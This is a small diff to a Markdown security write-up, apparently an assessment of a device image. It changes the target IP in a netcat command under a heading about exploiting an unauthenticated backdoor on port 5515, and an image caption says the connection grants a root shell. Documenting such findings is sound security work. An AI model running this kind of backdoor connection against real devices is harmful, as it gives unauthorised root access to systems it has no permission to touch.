@@ -84,7 +84,7 @@ With a correctly-built image flashed and booted, I performed an initial assessme
 ### Exploiting the unauthenticated backdoor (port 5515)
 
 ```bash
-nc -nv 192.168.0.3 5515
+nc -nv 192.168.0.5 5515
 ```
 
 ![Unauthenticated backdoor granting root shell](images/backdoor-exploit.png)
